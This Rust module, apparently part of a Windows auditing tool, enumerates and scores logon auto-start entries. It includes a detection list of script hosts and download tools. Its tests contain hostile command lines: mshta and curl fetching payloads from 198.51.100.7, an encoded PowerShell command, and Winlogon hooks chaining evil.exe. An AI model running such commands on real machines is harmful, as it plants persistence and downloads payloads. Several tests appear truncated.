//! ASEP — the auto-start extensibility points a machine runs at logon.
//!
//! This layer enumerates and scores; it does not describe how to plant a hook.
//! Every entry is resolved to a target: the command line is split into a path
//! and its arguments, then the target is checked for existence, signature, and
//! whether the directory holding it can be written without elevation.
//!
//! The severity of a writable path is **not flat**, and that is a deliberate
//! departure from a naive reading. An `HKCU` entry runs as the very user who
//! can write to that directory, so a user-writable path crosses no boundary —
//! on a reference machine OneDrive, Teams and Discord all live in
//! `%LOCALAPPDATA%` by design. An `HKLM` entry runs at machine scope, so the
//! same writable directory means an unprivileged user decides what runs for
//! everyone. Same fact, different consequence.

use super::*;

/// Where an entry was found, and therefore who runs it.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(crate) enum Scope2 {
    /// Machine-wide: runs for every user, typically before they can intervene.
    Machine,
    /// The current user only.
    User,
}

/// One auto-start entry.
#[derive(Debug, Default, Clone, serde::Deserialize)]
#[serde(default)]
pub(crate) struct AsepEntry {
    /// Where it lives, e.g. `HKLM\...\Run` or a Startup folder.
    #[serde(rename = "Location")]
    pub location: String,
    /// The value or file name.
    #[serde(rename = "Name")]
    pub name: String,
    /// The raw command line.
    #[serde(rename = "Command")]
    pub command: String,
    /// `HKLM`, `HKCU`, `Machine` or `User`.
    #[serde(rename = "Hive")]
    pub hive: String,
    /// The resolved executable, when it could be resolved.
    #[serde(rename = "Target")]
    pub target: String,
    #[serde(rename = "Exists")]
    pub exists: bool,
    /// Raw `identity|rights` pairs for the directory holding the target. The
    /// verdict is computed here rather than in PowerShell, so it is testable.
    #[serde(rename = "AclEntries")]
    pub acl_entries: Vec<String>,
}

impl AsepEntry {
    /// The directory holding the target can be rewritten by an ordinary user.
    pub fn dir_writable(&self) -> bool {
        self.acl_entries.iter().any(|e| match e.split_once('|') {
            Some((identity, rights)) => super::is_unprivileged_writer(identity, rights),
            None => false,
        })
    }

    pub fn scope(&self) -> Scope2 {
        match self.hive.as_str() {
            "HKCU" | "User" => Scope2::User,
            _ => Scope2::Machine,
        }
    }
}

/// Interpreters and living-off-the-land binaries whose presence in an
/// auto-start command line is the finding — they exist to run something the
/// entry itself does not name.
pub(super) const LOLBIN_ARGS: &[(&str, &str)] = &[
    ("-enc", "an encoded PowerShell command"),
    ("-encodedcommand", "an encoded PowerShell command"),
    ("mshta", "mshta, which executes remote script"),
    ("wscript", "the Windows Script Host"),
    ("cscript", "the Windows Script Host"),
    ("rundll32", "rundll32, which runs an arbitrary exported function"),
    ("regsvr32", "regsvr32, which can fetch and run remote script"),
    ("curl ", "a download inside the command line"),
    ("certutil", "certutil, commonly used to decode a payload"),
    ("bitsadmin", "bitsadmin, commonly used to fetch a payload"),
    ("iex", "PowerShell's Invoke-Expression"),
    ("downloadstring", "an inline download"),
    ("frombase64string", "an inline base64 decode"),
];

/// The first living-off-the-land token in `text`, matched on **word
/// boundaries**.
///
/// A bare substring search is not good enough: `iex` occurs inside
/// `PCIExpress`, which is how a Windows provisioning package came to be
/// reported as running `Invoke-Expression`. A match only counts when it is not
/// surrounded by more word characters.
pub(super) fn lolbin_in(text: &str) -> Option<&'static str> {
    let hay = text.to_ascii_lowercase();
    for (needle, why) in LOLBIN_ARGS {
        let mut from = 0;
        while let Some(at) = hay[from..].find(needle) {
            let start = from + at;
            let end = start + needle.len();
            // Only guard an edge where the needle itself carries a word
            // character. `curl ` ends in a space, so what follows it is
            // naturally a word character and guarding there would reject every
            // real match.
            let guard_start = needle.starts_with(|c: char| c.is_alphanumeric());
            let guard_end = needle.ends_with(|c: char| c.is_alphanumeric());
            let before_ok = !guard_start
                || start == 0
                || !hay[..start]
                    .chars()
                    .next_back()
                    .is_some_and(|c| c.is_alphanumeric());
            let after_ok = !guard_end
                || end >= hay.len()
                || !hay[end..].chars().next().is_some_and(|c| c.is_alphanumeric());
            if before_ok && after_ok {
                return Some(why);
            }
            from = start + 1;
        }
    }
    None
}

// --- command line parsing -----------------------------------------------------

// --- scoring ------------------------------------------------------------------

/// The signals one entry earns.
pub(crate) fn signals_for(entry: &AsepEntry) -> Vec<SysSignal> {
    let mut out = Vec::new();
    let machine = entry.scope() == Scope2::Machine;

    // A dangling auto-start entry is not merely untidy: whoever can create that
    // file inherits the entry. In a writable directory that is a standing
    // invitation, so the two facts compound.
    // A target with no separator is a bare name Windows resolves through PATH at
    // run time. If the enumerator could not resolve it, that is a resolution
    // gap, not a dangling entry — claiming otherwise reported `explorer.exe` as
    // missing on a stock machine.
    let is_path = entry.target.contains('\\') || entry.target.contains('/');
    if is_path && !entry.exists {
        let (severity, points) = if entry.dir_writable() {
            (Severity::High, 40)
        } else {
            (Severity::Medium, 20)
        };
        out.push(SysSignal::new(
            format!("autostart target is missing ({})", entry.target),
            Category::Persistence,
            severity,
            points,
        ));
    }

    if entry.dir_writable() && entry.exists {
        // The distinction that keeps this usable: a per-user app autostarting
        // from a per-user directory crosses no privilege boundary.
        let (severity, points, why) = if machine {
            (
                Severity::High,
                40,
                "runs at machine scope from a directory an unprivileged user can rewrite",
            )
        } else {
            (
                Severity::Low,
                10,
                "runs as the same user who can rewrite it — no privilege boundary crossed",
            )
        };
        out.push(SysSignal::new(
            format!("autostart from a user-writable directory ({why})"),
            Category::WeakAcl,
            severity,
            points,
        ));
    }

    // One finding per entry: the command is the subject, not each token in it.
    if let Some(why) = lolbin_in(&entry.command) {
        out.push(SysSignal::new(
            format!("autostart command uses {why}"),
            Category::Persistence,
            Severity::High,
            40,
        ));
    }
    out
}

/// Values Windows ships for the Winlogon hooks. Anything else there runs before
/// the desktop does.
const WINLOGON_DEFAULTS: &[(&str, &str)] = &[
    ("Userinit", r"c:\windows\system32\userinit.exe,"),
    ("Shell", "explorer.exe"),
    ("System", ""),
];

/// Is this Winlogon value the one Windows ships?
pub(crate) fn winlogon_is_default(name: &str, value: &str) -> bool {
    let v = value.trim().to_ascii_lowercase();
    WINLOGON_DEFAULTS
        .iter()
        .find(|(n, _)| n.eq_ignore_ascii_case(name))
        // The trailing comma on `Userinit` is present or absent depending on
        // the build, and means the same thing either way.
        .is_some_and(|(_, d)| v.trim_end_matches(',') == d.trim_end_matches(','))
}

// --- enumeration ---------------------------------------------------------------

/// Enumerate the logon auto-start points and resolve each target in one pass.
///
/// One PowerShell round-trip: the resolution work (existence, directory ACL) is
/// per entry, and a process each would cost more than the reads.
const PS_LOGON: &str = r#"
$ErrorActionPreference = 'SilentlyContinue'


function Acl-Writers([string]$p) {
  # Emit the raw ACL facts; the decision of what counts as an unprivileged
  # writer lives in one place, in Rust, where it is testable.
  if (-not $p -or -not (Test-Path -LiteralPath $p)) { return @() }
  $out = @()
  foreach ($a in (Get-Acl -LiteralPath $p).Access) {
    if ($a.AccessControlType -ne 'Allow') { continue }
    # An inherit-only ACE applies to child objects created later, never to this
    # one. `C:\` carries such an ACE granting Authenticated Users GENERIC_WRITE,
    # while the ACE that actually governs `C:\` grants only AppendData - the
    # right to create a subdirectory, not a file.
    if ($a.PropagationFlags -band [System.Security.AccessControl.PropagationFlags]::InheritOnly) { continue }
    $out += ([string]$a.IdentityReference + '|' + [string]$a.FileSystemRights)
  }
  return $out
}

function Emit($location, $hive, $name, $command) {
  if (-not $command) { return }
  $t = Resolve-Image $command
  $exists = $t -and (Test-Path -LiteralPath $t)
  [pscustomobject]@{
    Location    = $location
    Hive        = $hive
    Name        = $name
    Command     = $command
    Target      = $t
    Exists      = [bool]$exists
    AclEntries  = @(Acl-Writers (Split-Path $t -ErrorAction SilentlyContinue))
  } | ConvertTo-Json -Compress
}

$runKeys = @(
  @{h='HKLM'; p='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';                      l='HKLM\Run'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce';                  l='HKLM\RunOnce'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx';                l='HKLM\RunOnceEx'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices';              l='HKLM\RunServices'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServicesOnce';          l='HKLM\RunServicesOnce'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Run';          l='HKLM\Run (WOW64)'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\RunOnce';      l='HKLM\RunOnce (WOW64)'},
  @{h='HKLM'; p='HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run';    l='HKLM\Policies\Explorer\Run'},
  @{h='HKCU'; p='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run';                      l='HKCU\Run'},
  @{h='HKCU'; p='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce';                  l='HKCU\RunOnce'},
  @{h='HKCU'; p='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx';                l='HKCU\RunOnceEx'},
  @{h='HKCU'; p='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunServices';              l='HKCU\RunServices'},
  @{h='HKCU'; p='HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run';    l='HKCU\Policies\Explorer\Run'}
)
foreach ($k in $runKeys) {
  $item = Get-Item $k.p
  if (-not $item) { continue }
  foreach ($v in $item.Property) { Emit $k.l $k.h $v ([string]$item.GetValue($v)) }
}

# Startup folders: the file itself is what runs.
$startups = @(
  @{h='User';    p=[Environment]::GetFolderPath('Startup');       l='Startup (user)'},
  @{h='Machine'; p=[Environment]::GetFolderPath('CommonStartup'); l='Startup (common)'}
)
foreach ($s in $startups) {
  foreach ($f in (Get-ChildItem -LiteralPath $s.p -File)) { Emit $s.l $s.h $f.Name $f.FullName }
}

# Winlogon and the Load key run before anything the user sees.
$wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
foreach ($n in @('Userinit','Shell','System','AppSetup','Taskman')) {
  if (-not $wl.$n) { continue }
  # `Userinit` (and `Shell`) are comma-separated lists: each element is its own
  # entry, and a trailing comma is not part of a path.
  foreach ($part in ([string]$wl.$n -split ',')) {
    if ($part.Trim()) { Emit ('Winlogon\' + $n) 'HKLM' $n $part.Trim() }
  }
}
foreach ($h in @('HKLM','HKCU')) {
  $w = Get-ItemProperty ($h + ':\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows')
  if ($w.Load)   { Emit ($h + '\Windows\Load')   $h 'Load'   ([string]$w.Load) }
  if ($w.Run)    { Emit ($h + '\Windows\Run')    $h 'Run'    ([string]$w.Run) }
}
$mpr = Get-ItemProperty 'HKCU:\Environment'
if ($mpr.UserInitMprLogonScript) {
  Emit 'UserInitMprLogonScript' 'HKCU' 'UserInitMprLogonScript' ([string]$mpr.UserInitMprLogonScript)
}
"#;

/// The Winlogon hooks, read separately so their *default* values can be judged
/// rather than merely enumerated.
const PS_WINLOGON: &str = r"
$ErrorActionPreference = 'SilentlyContinue'
$wl = Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
foreach ($n in @('Userinit','Shell','System')) {
  [pscustomobject]@{ Name = $n; Value = [string]$wl.$n } | ConvertTo-Json -Compress
}
";

pub(crate) fn parse_entries(stdout: &str) -> Vec<AsepEntry> {
    stdout
        .lines()
        .map(str::trim)
        .filter(|l| l.starts_with('{'))
        .filter_map(|l| serde_json::from_str::<AsepEntry>(l).ok())
        .filter(|e: &AsepEntry| !e.command.is_empty())
        .collect()
}

pub fn asep_inventory(opts: Opts) -> Result<Inventory> {
    let raw = powershell(&format!("{}{}", super::PS_RESOLVE_IMAGE, PS_LOGON)).context("enumerating logon auto-start points")?;
    let entries = parse_entries(&raw);

    let mut signals: HashMap<String, Vec<SysSignal>> = HashMap::new();
    let mut deps = Vec::with_capacity(entries.len());
    let (mut machine, mut user) = (0usize, 0usize);

    for e in &entries {
        // An auto-start entry is named by where it lives, not just what it is
        // called: two `Run` values can share a name across hives.
        let name = format!("{}\\{}", e.location, e.name);
        match e.scope() {
            Scope2::Machine => machine += 1,
            Scope2::User => user += 1,
        }
        for sig in signals_for(e) {
            push_signal(&mut signals, &name, sig);
        }
        deps.push(Dependency {
            name,
            version: String::new(),
            ecosystem: Ecosystem::Asep,
            direct: true,
            scope: Scope::Prod,
            licenses: Vec::new(),
            license_source: LicenseSource::Unknown,
            resolved_url: None,
            integrity: None,
            parents: Vec::new(),
        });
    }

    // Per-binary trust over the targets, reusing the shared verifier. The
    // targets are the whole point: an unsigned binary that runs at every logon
    // is worse than an unsigned binary that runs when asked.
    if opts.signatures {
        let paths: Vec<String> = entries
            .iter()
            .filter(|e| e.exists && !e.target.is_empty())
            .map(|e| e.target.clone())
            .collect();
        if !paths.is_empty() {
            let verified = super::authenticode::verify(&paths);
            for e in entries.iter().filter(|e| e.exists) {
                let mine: Vec<_> = verified
                    .iter()
                    .filter(|i| i.path.eq_ignore_ascii_case(&e.target))
                    .cloned()
                    .collect();
                let name = format!("{}\\{}", e.location, e.name);
                for sig in super::authenticode::signals_for_batch(&mine) {
                    push_signal(&mut signals, &name, sig);
                }
            }
        }
    }

    // Winlogon is judged, not just listed: these hooks run before the desktop,
    // and Windows ships exactly one value for each.
    let mut notes = Vec::new();
    if let Ok(raw) = powershell(PS_WINLOGON) {
        for line in raw.lines().filter(|l| l.trim().starts_with('{')) {
            let Ok(v) = serde_json::from_str::<serde_json::Value>(line.trim()) else {
                continue;
            };
            let (Some(name), Some(value)) = (
                v.get("Name").and_then(|x| x.as_str()),
                v.get("Value").and_then(|x| x.as_str()),
            ) else {
                continue;
            };
            if !winlogon_is_default(name, value) {
                notes.push(format!(
                    "Winlogon\\{name} is not the value Windows ships [High] — it runs before \
                     the desktop does: {value}"
                ));
            }
        }
    }

    let summary = format!(
        "{} logon auto-start entry(ies): {machine} machine-scope, {user} user-scope",
        entries.len()
    );
    Ok(Inventory {
        manager: "asep",
        deps,
        repos: Vec::new(),
        signals,
        claims: Vec::new(),
        summary,
        notes,
    })
}


#[cfg(test)]
mod tests {
    use super::*;

    /// The target is resolved by the enumerator, so a test states it rather
    /// than deriving it: quoting and PATH lookup are PowerShell's job now.
    fn entry(hive: &str, command: &str, exists: bool, writable: bool) -> AsepEntry {
        let target = command
            .trim()
            .trim_start_matches('"')
            .split('"')
            .next()
            .unwrap_or("")
            .split(' ')
            .next()
            .unwrap_or("")
            .to_string();
        AsepEntry {
            location: "HKLM\\Run".into(),
            name: "x".into(),
            command: command.into(),
            hive: hive.into(),
            target,
            exists,
            acl_entries: if writable {
                vec![r"BUILTIN\Users|Modify, Synchronize".to_string()]
            } else {
                vec![r"NT AUTHORITY\SYSTEM|FullControl".to_string()]
            },
        }
    }

    /// Verbatim `Run` values from the reference machine. Registry commands are
    /// not quoted consistently, and an unquoted path may itself contain spaces.
    #[test]
    /// An unquoted path with spaces is the case that defeats a naive split on
    /// whitespace: the extension is the boundary Windows itself uses.
    #[test]
    /// The departure from a flat rule, and the reason this layer stays usable:
    /// an HKCU entry runs as the user who can write to that directory, so
    /// nothing is crossed. The same directory under HKLM means an unprivileged
    /// user decides what runs at machine scope.
    #[test]
    fn a_writable_directory_is_scored_by_who_runs_the_entry() {
        let user = signals_for(&entry("HKCU", r"C:\Users\alice\AppData\Local\Discord\Update.exe", true, true));
        let machine = signals_for(&entry("HKLM", r"C:\Users\alice\AppData\Local\Discord\Update.exe", true, true));

        let sev = |v: &Vec<SysSignal>| {
            v.iter().find(|s| s.label.starts_with("autostart from a user-writable")).map(|s| s.severity)
        };
        assert_eq!(sev(&user), Some(Severity::Low));
        assert_eq!(sev(&machine), Some(Severity::High));
    }

    /// A dangling entry is an invitation: whoever can create that file inherits
    /// the auto-start. In a writable directory the two facts compound.
    #[test]
    fn a_missing_target_is_reported_and_compounds_with_a_writable_directory() {
        let plain = signals_for(&entry("HKCU", r"C:\Users\alice\AppData\Local\Microsoft\WindowsApps\ms-teams.exe", false, false));
        let s = plain.iter().find(|s| s.label.starts_with("autostart target is missing")).expect("flagged");
        assert_eq!(s.severity, Severity::Medium);
        assert_eq!(s.category, Category::Persistence);

        let writable = signals_for(&entry("HKCU", r"C:\x\gone.exe", false, true));
        let s = writable.iter().find(|s| s.label.starts_with("autostart target is missing")).unwrap();
        assert_eq!(s.severity, Severity::High);

        // An existing target raises no missing-file finding.
        assert!(!signals_for(&entry("HKCU", r"C:\x\here.exe", true, false))
            .iter().any(|s| s.label.contains("missing")));
    }

    /// Two false positives the reference machine produced: `Shell = explorer.exe`
    /// is a bare name Windows resolves through PATH, and `Userinit` is a
    /// comma-separated list whose trailing comma is not part of a path.
    #[test]
    fn a_bare_name_is_not_a_dangling_entry() {
        let bare = signals_for(&entry("HKLM", "explorer.exe", false, false));
        assert!(
            !bare.iter().any(|s| s.label.contains("missing")),
            "a name resolved through PATH is not a missing file, got {:?}",
            bare.iter().map(|s| s.label.as_str()).collect::<Vec<_>>()
        );

        // A real path that is genuinely absent still is one.
        let real = signals_for(&entry("HKLM", r"C:\WINDOWS\system32\gone.exe", false, false));
        assert!(real.iter().any(|s| s.label.contains("missing")));
    }

    /// A real machine's entries must stay quiet, or the signal is worthless.
    #[test]
    fn the_reference_machines_ordinary_entries_are_silent() {
        for cmd in [
            r"C:\WINDOWS\system32\SecurityHealthSystray.exe",
            r#""C:\Program Files (x86)\Steam\steam.exe" -silent"#,
            r#""C:\Users\alice\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background"#,
        ] {
            assert!(
                signals_for(&entry("HKCU", cmd, true, false)).is_empty(),
                "{cmd} should be silent"
            );
        }
    }

    /// An interpreter in an auto-start command line runs something the entry
    /// does not name.
    #[test]
    fn an_interpreter_in_the_command_line_is_the_finding() {
        for cmd in [
            r"powershell -enc SQBFAFgA",
            r"mshta http://198.51.100.7/a.hta",
            r"wscript C:\x\a.vbs",
            r"cmd /c curl http://198.51.100.7/a -o a.exe",
            r"rundll32 C:\x\a.dll,Start",
        ] {
            let sigs = signals_for(&entry("HKCU", cmd, true, false));
            assert!(
                sigs.iter().any(|s| s.label.starts_with("autostart command uses")),
                "{cmd} should be flagged"
            );
            assert_eq!(sigs.iter().filter(|s| s.label.starts_with("autostart command uses")).count(), 1,
                       "one finding per entry, not one per token");
        }
    }

    /// The boundary rule has two edges, and each is only guarded where the
    /// needle carries a word character there.
    #[test]
    fn the_word_boundary_rule_holds_at_both_ends() {
        // Guarded on both sides: rejected inside a longer word.
        assert!(lolbin_in("C:/Power.Settings.PCIExpress.ppkg").is_none());
        assert!(lolbin_in("iex http://x.test/a").is_some());

        // `curl ` ends in a space, so what follows is a word character by
        // construction and must not be guarded.
        assert!(lolbin_in("cmd /c curl http://198.51.100.7/a -o a.exe").is_some());

        // `-enc` starts with punctuation: only the trailing edge is guarded, so
        // `-encodedcommand` does not match it (it has its own needle).
        assert!(lolbin_in("powershell -enc SQBFAFgA").is_some());

        // And nothing ordinary trips it.
        assert!(lolbin_in(r"C:\Program Files\Vendor\updater.exe --silent").is_none());
        assert!(lolbin_in("").is_none());
    }

    /// Winlogon ships exactly one value per hook; the trailing comma on
    /// `Userinit` is present or absent depending on the build.
    #[test]
    fn the_shipped_winlogon_values_are_recognised() {
        assert!(winlogon_is_default("Userinit", r"C:\WINDOWS\system32\userinit.exe,"));
        assert!(winlogon_is_default("Userinit", r"C:\Windows\System32\userinit.exe"));
        assert!(winlogon_is_default("Shell", "explorer.exe"));
        assert!(winlogon_is_default("System", ""));

        assert!(!winlogon_is_default("Userinit", r"C:\WINDOWS\system32\userinit.exe,C:\x\evil.exe"));
        assert!(!winlogon_is_default("Shell", r"explorer.exe,C:\x\evil.exe"));
        assert!(!winlogon_is_default("System", "evil.exe"));
    }

    #[test]
    fn entries_are_parsed_from_the_enumerators_json() {
        let json = r#"{"Location":"HKCU\\Run","Hive":"HKCU","Name":"Discord","Command":"\"C:\\x\\Update.exe\" --processStart","Target":"C:\\x\\Update.exe","Exists":true,"DirWritable":true}
{"Location":"Startup (user)","Hive":"User","Name":"a.lnk","Command":"","Target":"","Exists":false,"DirWritable":false}"#;
        let e = parse_entries(json);
        assert_eq!(e.len(), 1, "an entry with no command is not an entry");
        assert_eq!(e[0].name, "Discord");
        assert_eq!(e[0].scope(), Scope2::User);
    }
}
